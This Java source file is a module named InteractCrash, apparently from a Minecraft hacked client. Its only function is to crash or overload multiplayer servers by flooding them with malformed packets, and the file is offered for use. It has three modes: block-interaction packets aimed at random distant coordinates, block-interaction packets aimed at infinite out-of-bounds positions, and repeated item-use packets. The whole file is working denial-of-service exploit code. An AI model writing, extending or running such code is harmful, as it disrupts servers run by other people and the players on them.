// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class InteractCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.NoCom);
    private final Setting<Integer> amount = new Setting<>("Amount", 15, 1, 100);

    public InteractCrash() {
        super("InteractCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        switch (mode.getValue()) {
            case NoCom -> {
                Random r = new Random();
                for (int i = 0; i < amount.getValue(); i++) {
                    Vec3d cpos = new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0));
                }
            }
            case OOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
            }
            case Item -> {
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, mc.player.getYaw(), mc.player.getPitch()));
                }
            }
        }
    }

    public enum Mode {
        NoCom, OOB, Item
    }
}
